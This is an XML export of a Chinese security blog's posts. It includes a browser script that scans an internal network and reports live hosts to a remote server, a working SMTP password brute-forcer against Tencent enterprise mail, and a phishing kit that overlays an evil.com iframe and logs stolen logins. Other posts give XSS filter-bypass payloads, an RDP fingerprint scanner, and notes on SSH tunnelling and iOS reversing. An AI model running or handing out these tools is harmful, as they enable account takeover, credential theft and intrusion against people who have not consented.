&quot;xxxxx&quot;;&#125;＝＝＝＝代码貌似不全＝＝＝＝function ipsend(ip, netport)&#123;var ipdata &#x3D; ip+&quot;:&quot;+netport;var url &#x3D; &quot;x.x.x.x&quot;;var xmlhttp1 &#x3D; new XMLHttpRequest();xmlhttp1.open(&quot;POST&quot;,url,true);xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);function ipCreate(ip)&#123;var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;ElementCreate(ips+i,&quot;80&quot;,i);ElementCreate(ips+i,&quot;8087&quot;,i);ElementCreate(ips+i,&quot;8080&quot;,i);&#125;&#125;function ElementCreate(ip,xport,i)&#123;var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;var scriptElement &#x3D; document.createElement(&quot;script&quot;);scriptElement.src &#x3D; url;scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);document.body.appendChild(scriptElement);&#125;ipcreate(&quot;10.10.125.195&quot;);&#125;&#x3D;＝＝＝＝代码貌似不全＝＝＝＝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Fun </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>某企业邮箱爆破</title>
      <link href="/2017/05/19/baopo-Q.html"/>
      <url>/2017/05/19/baopo-Q.html</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python# coding: utf-8import smtplibimport randomimport timeimport sysdef tencent(user, password):time.sleep(random.uniform(2, 6))smtp_server &#x3D; &quot;smtp.exmail.qq.com&quot;smtp_port &#x3D; 587server &#x3D; smtplib.SMTP(smtp_server, smtp_port)server.starttls()try:server.login(user, password)print &#39;[+]----------auth success------%s&#39; % passwordexcept smtplib.SMTPAuthenticationError as e:print &#39;[+] Auth Fail %s: %s&#39; % (user, password)def genpasswd(user, suffix):domain &#x3D; suffix.split(&#39;.&#39;)[0]password &#x3D; []password.append(domain + &#39;@123&#39;)password.append(domain + &#39;@1234&#39;)name &#x3D; user.split(&#39;@&#39;)[0]wake_value&#x3D;[&#39;!@#$%^1qazxsw2 &#39;, &#39;admin!@#&#39;, &#39;Abc123&#39;, &#39;123456aa~&#39;, &#39;qazwsx123&#39;, &#39;1qaz2wsx&#39;, &#39;asd123456&#39;, &#39;123456a~&#39;, &#39;Asdf1234&#39;, &#39;Qwer1234&#39;, &#39;Abcd1234&#39;, &#39;a123456&#39;, &#39;123456a&#39;, name[0].upper()+name[1:]+&#39;123&#39;, name+&#39;123&#39;, name+&#39;1234&#39;,name+&#39;@2016&#39;, name+&#39;@2017&#39;]password.extend(wake_value)return passworddef genusers(userfiles, suffix):users &#x3D; []with open(userfiles, &#39;rb&#39;) as f:while 1:user &#x3D; f.readline().strip()if user &#x3D;&#x3D; &#39;&#39;:breakusers.append(user + &#39;@&#39; + suffix)return usersif __name__ &#x3D;&#x3D; &quot;__main__&quot;:if len(sys.argv) !&#x3D; 3:print &#39;Usage: %s userfile domain&#39; % sys.argv[0]print &#39;%s users.txt baidu.com&#39; % sys.argv[0]exit(0)userfile &#x3D; sys.argv[1]suffix &#x3D; sys.argv[2]for user in genusers(userfile, suffix):for password in genpasswd(user, suffix):tencent(user, password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS编码</title>
      <link href="/2017/04/12/xss-encode2.html"/>
      <url>/2017/04/12/xss-encode2.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://jkme.github.io/xss-encode-decode.html">http://jkme.github.io/xss-encode-decode.html</a></li><li><a href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></li></ul><p>在前面文章里面xss的编码提到过这个东西: </p><pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:1. HTML Decoding2. URL Decoding3. Javascript Decodinghttp:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<strong>HTML标签里面</strong>，js之行之前，html形式的编码会自动decode。</p><p>解释：</p><p><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(HtmlEncode(x))&quot;&gt;xsstest&lt;/button&gt;</code></p><p>丢到test.html里面，使用浏览器打开还是原样。</p><p>所以xss存在的步骤来说是这样的：<br><code>代码--&gt; 浏览器执行 --&gt; xss</code></p><p>浏览器解释了其中的代码展现给人看。</p><p>HTML的自动解码是在执行js代码之前，并且<code>on*</code>事件内可以执行js脚本，即 <strong>html解码之后才可以执行js</strong>。</p><p>如下的代码先htmldecode，然后执行js，最终造成DOM Xss：</p><pre class="line-numbers language-none"><code class="language-none">&lt;button type&#x3D;&quot;submit&quot; onclick&#x3D;&quot;x&#x3D;&#39;&lt;img src&#x3D;@ onerror&#x3D;alert(123) &#x2F;&gt;&#39;;document.write(x)&quot;&gt;xsstest2&lt;&#x2F;button&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>自动解码之后的代码如下：<br><code>&lt;button type=&quot;submit&quot; onclick=&quot;x=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;;document.write(x)&quot;&gt;xsstest2&lt;/button&gt; </code></p><p>OK到了上面的地方，如果这里想要试用URL编码，看这里<br><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html">https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html</a>利用location变形xss代码。</p><p>加个例子（快把原文的摘抄完了）:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php $para &#x3D; $_GET[&#39;category&#39;];$para &#x3D; htmlspecialchars($para, ENT_QUOTES); &#x2F;&#x2F; 将单引号进行HTML编码&#x2F;&#x2F;$para &#x3D; urlencode($para);$url_herf &#x3D; &quot;http:&#x2F;&#x2F;joychou.org&#x2F;?category&#x3D;&quot; . $para ;?&gt;&lt;button type&#x3D;&quot;submit&quot; onclick&#x3D;&quot;window.location.href&#x3D;&#39;&lt;?php echo $url_herf; ?&gt;&#39;&quot;&gt;click&lt;&#x2F;button&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POC:<br><code>http://localhost/pentest/xss/domxss/onclick.php?category=web&#39;-alert(1)-&#39;</code></p><p>上面代码进去之后，结果会是这样的:</p><p><code>&lt;button type=&quot;submit&quot; onclick=&quot;window.location.href=&#39;http://joychou.org/?category=web&amp;#039;-alert(1)-&amp;#039;&#39;&quot;&gt;click&lt;/button&gt;</code></p><p>减号是一个操作符，在js里面，减号两边的表达式都会执行，最后产生一个domxss。</p><p>一般来说xss的防御就是在前端或者后端统一对输出进行html编码，但是不管前端还是后端统一做HTML编码，都会存在这样一个问题：如果编码之后的变量赋值在可执行的javascript的html tag中，会导致domxss。</p><p>作者给出了两种修复方式：</p><ul><li>进行URL编码（不影响显示的情况)</li><li>针对变量值的范围做具体的限制（比如value的白名单，value长度，value类型)</li></ul><p><a href="http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html">http://joychou.org/index.php/web/domxss-cause-by-html-auto-decode.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>How To Fishing</title>
      <link href="/2017/04/01/how-to-fish.html"/>
      <url>/2017/04/01/how-to-fish.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>[XSS钓鱼模拟实战]<a href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p></blockquote><h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html假的登录页面: fake.html世界上最好的语言: deal.phpfish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul><li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li></ul><p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p><p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p><ul><li>然后再服务器上构造一个deal.php</li></ul><pre class="line-numbers language-none"><code class="language-none">&lt;?php$user &#x3D; $_POST[&#39;username&#39;];$pass &#x3D; $_POST[&#39;password&#39;];$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);fclose($f);header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>还差一个js</li></ul><pre class="line-numbers language-none"><code class="language-none"> document.body.innerHTML&#x3D;&#39;&lt;div style&#x3D;&quot;position:absolute;top:0px;left:0px;width:100%;height:100%&quot;&gt;&#39;+&#39;&lt;iframe frameborder&#x3D;&quot;no&quot; scrolling&#x3D;&quot;no&quot; border&#x3D;&quot;no&quot; src&#x3D;http:&#x2F;&#x2F;evil.com&#x2F;fake.html width&#x3D;100% height&#x3D;100%&gt;&#39; +&#39;&lt;&#x2F;iframe&gt;&lt;&#x2F;div&gt;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当fish.js插入到后台的时候，会覆盖掉当前页面，然后受害者输入用户密码，就可以在服务器上收到用户密码。</p><p>这里存在一个问题，如果受害者的页面不停刷新，会一致执行js，一直出现fake登录页面，所以可以在服务区上执行一个python脚本，监听pass.txt文件是否是空，不是空就退出，同时删除掉fish.js和fake.html</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python# coding: utf-8import sysimport osimport datetimewhile 1:if os.path.getsize(&#39;pass.txt&#39;) &#x3D;&#x3D; 0:print datetime.datetime.now()else:os.system(&quot;rm -rf fish.js&quot;)os.system(&quot;rm -rf fake.html&quot;)sys.exit(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至此构造完成，当python脚本退出的时候，密码就记录到了pass.txt文件</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux复制带动态库的命令</title>
      <link href="/2017/03/09/copy-shared-lib.html"/>
      <url>/2017/03/09/copy-shared-lib.html</url>
      
        <content type="html"><![CDATA[<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p><pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bashif [ $# !&#x3D; 2 ] ; then    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;    exit 1fiPATH_TO_BINARY&#x3D;&quot;$1&quot;TARGET_FOLDER&#x3D;&quot;$2&quot;# if we cannot find the the binary we have to abortif [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;    exit 1fi# copy the binary to the target folder# create directories if requiredecho &quot;---&gt; copy binary itself&quot;cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;# copy the required shared libs to the target folder# create directories if requiredecho &quot;---&gt; copy libraries&quot;for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do   if [ -f &quot;$lib&quot; ] ; then        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;   fi  done# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.# however, I&#39;ve not tested that yet# create lib64 - if required and link the content from lib to itif [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p><ul><li><a href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss基础编码</title>
      <link href="/2017/03/02/xss-encode-decode.html"/>
      <url>/2017/03/02/xss-encode-decode.html</url>
      
        <content type="html"><![CDATA[<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p><pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:1. HTML Decoding2. URL Decoding3. Javascript Decodinghttp:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三种编码，对于html来说是(10进制和16进制）</p><h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul><li>十进制：<code>&amp;#60;</code> </li><li>html十六: <code>&amp;#x3c;</code></li></ul><h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p><ul><li>八进制:<code>\74</code> </li><li>十六进制: <code>\x3c</code></li><li>unicode编码: <code>\u003c</code></li></ul><h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul><li>url: %3C </li><li>base64: PA==</li></ul><h3 id="体编码本身存在的意义"><a href="#体编码本身存在的意义" class="headerlink" title="体编码本身存在的意义"></a>体编码本身存在的意义</h3><p>html实体编码本身存在的意义是防止与HTML本身语义标记的冲突</p><p>举个例子：</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;alert(66)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面保存未html文档之后，用浏览器打开，弹出的是66，查看源代码可以看到两个是一模一样，不同的就是第二个可以执行，第一个只是在页面显示出来。</p><p>那么正常网站的需求是这样的：</p><p>用户输入–&gt;filter–&gt;浏览器显示</p><p>如果filter不能很好的处理转义标签，最终展现的页面就可能会执行用户输入的有害代码。这就是xss</p><p>我们来瞅瞅如下个链接可以得出什么结果：</p><ul><li><a href="http://wooyun.jozxing.cc/static/drops/tips-689.html">http://wooyun.jozxing.cc/static/drops/tips-689.html</a></li><li><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html">https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/papers-894.html">http://wooyun.jozxing.cc/static/drops/papers-894.html</a></li><li><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html">https://www.leavesongs.com/PENETRATION/xss-collect.html</a></li></ul><p>html编码和js编码不可以到处乱用，到处乱用也可以，但是要遵守规则：<br>比如：<br><code>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</code></p><p>上面可以弹，这是html实体编码，为毛不可以js编码呢，因为他在html标签里面啊。</p><p>你说你非要用js，OK，用P神里面的文章可以额这样来实现：<br><code> &lt;img src=&quot;1&quot; onerror=location=&quot;javascript:alert%281%29&quot;&gt;</code></p><p>利用location变形,就可以在后面使用js编码咯：</p><p><code>&lt;img src=&quot;1&quot; onerror=location=&quot;javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0036\u0036\u0036\u0022\u0029&quot;&gt;</code></p><h3 id="只有在js中才可以拼接字符串"><a href="#只有在js中才可以拼接字符串" class="headerlink" title="只有在js中才可以拼接字符串"></a>只有在js中才可以拼接字符串</h3><pre class="line-numbers language-none"><code class="language-none">Wrong:&lt;img&#x2F;src&#x3D;&#39;x&#39;onerror&#x3D;&#39;al&#39;+&#39;er&#39;+&#39;t(1)&#39;&gt;right:&lt;img&#x2F;src&#x3D;&#39;x&#39;onerror&#x3D;location&#x3D;&quot;javascr&quot;+&quot;ipt:al&quot;+&quot;ert%28docu&quot;+&quot;ment.co&quot;+&quot;okie%29&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面的是利用location来变形xss，现在来瞅瞅如下的代码:</p><pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;this is alert(1)&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#50;&amp;#51;&amp;#41;&amp;#10;&quot;&gt;this is html encode&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:%61%6c%65%72%74%28%32%32%29&quot;&gt;abc&lt;&#x2F;a&gt;&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;location&#x3D;&quot;javascr&quot;+&quot;ipt:al&quot;+&quot;ert%28docu&quot;+&quot;ment.co&quot;+&quot;okie%29&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>第二个和第四个都用到了url encode，貌似在html标签和js里面都能使用URL encodeing</li><li>其中第四个里面转换为location，location可以加载javascript伪协议，所以这里可以写js编码转换。</li></ul><p>最后我门来欣赏下各路风骚的payload:<br><a href="http://wooyun.jozxing.cc/static/drops/papers-894.html">http://wooyun.jozxing.cc/static/drops/papers-894.html</a><br>如果链接失效了，请搜索xss 比赛write up第一期</p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3389指纹扫描</title>
      <link href="/2017/02/28/3389-scan.html"/>
      <url>/2017/02/28/3389-scan.html</url>
      
        <content type="html"><![CDATA[<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p><ul><li>TCP三次握手</li><li>客户端发送COTP协议</li><li>服务端发送TPKT</li></ul><p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p><p>最后的python脚本是这样的：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python# coding: utf-8import socketimport binasciiimport sysimport threadingfrom Queue import Queuedef verify(sock, port):while 1:buff &#x3D; sock.recv(2048)if not buff:breakb &#x3D; bytearray(buff)print &quot;[+] %s&quot; % binascii.hexlify(b)detect_os(binascii.hexlify(b), port)# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:# print &quot;[+] RDP Port is %s&quot; % port# sys.exit(0)def detect_os(res, port):d &#x3D; &#123;&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;&#125;for key, value in d.iteritems():if value &#x3D;&#x3D; res:print &quot;[+] Os May be: %s&quot; % keyprint &quot;[+] RDP Port is %s&quot; % portsys.exit(0)def send_payload(sock):sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)def worker():while not q.empty():port &#x3D; q.get()try:scan(port)finally:q.task_done()def scan(port):try:s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.settimeout(2)sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)sys.stdout.flush()if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:print &quot;[+] Connect Success %s&quot; % portsend_payload(s)verify(s, port)except Exception, e:# raise epasss.close()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:if len(sys.argv) !&#x3D; 2:print &quot;Usage: %s IP&quot; % sys.argv[0]sys.exit(0)ip &#x3D; sys.argv[1]q &#x3D; Queue()map(q.put, xrange(3300, 65535))threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]map(lambda x: x.start(), threads)q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH端口转发</title>
      <link href="/2017/02/16/ssh-port-forward.html"/>
      <url>/2017/02/16/ssh-port-forward.html</url>
      
        <content type="html"><![CDATA[<p>以下几个原则：</p><ul><li>SSH简单来说就是2台机器之间安全的数据通道，它包括ssh的client和ssh的server2个角色，这样的一条通道就是(ssh tunneling)</li><li>SSH端口转发需要ssh连接，同时SSH连接有方向，从SSH Client到SSH Server</li><li>同理应用请求也是有方向的，一般是客户端向服务端发出请求</li><li>一旦这两个方向相同，称为SSH的本地转发(-L)，反之称为远端转发(-R）</li></ul><h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p><p>通过sshserver建立与host的连接，并将host的hostport绑定到本地的localport端口</p><p>应用场景：比如有一台应用服务器appserver（appserver.com），要访问其80端口，但是本地却不能直接访问，于是可以借助一台可以访问appserver的sshserver（sshserver.com）来访问它。<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p><p>ssh链接建立之后，发送到本地8000的包会通过sshserver转发给appserver的80端口</p><h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>远程转发可以通过本地主机，将remoteserver与host连接，host的hostport<br>将会映射到remoteserver的remoteport端口</p><p>应用场景: 一台应用服务器appserver(appserver.com），只有本地才能访问80端口，假如remoteserver想访问appserver的80端口，需要通过本地主机做隧道来完成。</p><p><code>ssh -R 8000:appserver.com:80 user@remoteserver.com</code><br>之后要求输入user用户在remoteserver上的密码。</p><p>remoteserver会监听自己的8000端口，其后发往remoteserver的8000端口的包，会通过本地服务器发到remoteserver的80端口。</p><blockquote><p>如果访问<a href="http://remoteserver:remoteport，注意修改remoteserver的ssh配置,`sshd_config添加GatewayPorts">http://remoteserver:remoteport，注意修改remoteserver的ssh配置,`sshd_config添加GatewayPorts</a> yes`</p></blockquote><p><code>https://ricterz.me/posts/Mount%20NFS%20via%20Proxy?_=1487726774098</code></p><p>这篇文章里面是这样用的：</p><p><code>ssh ricterz.me -lroot -R[remoteport]:localhost:[localport] －CNfg</code></p><h3 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h3><p><code>ssh -D &lt;localport&gt; &lt;sshserver&gt;</code></p><p>监听本地localport端口，创建一个通过sshserver连接的socks服务，之后发往localport的代理请求将会通过sshserver转到相应地址。</p><p><code>ssh -D 8000 user@sshserver.com</code></p><p>输入user的密码之后，你就可以将浏览器的socks5代理设为自己的8000端口，之后会有数据以加密的方式传给sshserver，sshserver获取<a href="http://www.blockedwebsite.com之后返回本地./">www.blockedwebsite.com之后返回本地。</a></p><pre class="line-numbers language-none"><code class="language-none">-f ssh在后台运行，即认证之后，ssh退居后台-T 不要分配tty终端-N 不要在服务器执行命令-C  压缩数据包-i  指定认证密钥-n  将studio重定向到&#x2F;dev&#x2F;null 与-f配合使用-q  安静模式-l  指定连接远程服务器的用户名-g  允许远程主机连接主机的转发端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外：<br><code>ssh -f -L 1234:localhost:6667 server.example.com sleep 10</code><br>后台运行转发，但是再ssh运行后10秒钟都没有连接1234端口的话，ssh自动退出。</p><ul><li><a href="http://wlwang41.github.io/content/ops/ssh%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86.html">http://wlwang41.github.io/content/ops/ssh%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86.html</a></li><li><a href="http://lcwangchao.github.io/linux/unix/2012/08/03/sshport/">http://lcwangchao.github.io/linux/unix/2012/08/03/sshport/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IOS逆向入门</title>
      <link href="/2017/02/02/mac-re.html"/>
      <url>/2017/02/02/mac-re.html</url>
      
        <content type="html"><![CDATA[<p>最后找到了加密的秘钥，找到之后发现整个流程好简单。之前找不到首先不熟悉Object-C的语法，其次就是arm指令，记录如下：</p><h2 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h2><p>首先是要用到的工具，中间主要用了ida，hopper和lldb</p><ul><li>dumpdecrypted: 将苹果加密过的app砸壳</li><li>class-dump: 导出MachO文件里ObjC类及方法定义</li><li>CydiaSubstrate: 将第三方动态库注入进程</li><li>Cycript: 用js语法写ObjC方法</li><li>Theos: 越狱插件开发工具</li><li>IDA: 反汇编、反编译工具</li><li>Hopper: OSX反汇编、反编译工具</li><li>Debugserver + LLDB: 动态调试器</li></ul><h2 id="0x02-ARM指令"><a href="#0x02-ARM指令" class="headerlink" title="0x02 ARM指令"></a>0x02 ARM指令</h2><pre class="line-numbers language-none"><code class="language-none">arm是RISC结构，数据从内存到CPU之间移动只能通过L&#x2F;S指令来完成，就是ldr&#x2F;str指令ldr 把数据从内存移到cpustr 把cpu的数据数据转移到内存lldb读取内存的数据，memory read &lt;start&gt; &lt;end&gt;ldr r0, 0x12345678   &#x2F;&#x2F;把0x12345678这个地址中的值存放到r0中ldr r0, &#x3D;0x12345678  &#x2F;&#x2F;把0x12345678这个地址写到r0中例子：COUNT EQU 0x40003100 &#x2F;&#x2F;定义一个COUNT变量，地址是0x40003100...LDR R1,&#x3D;COUNT       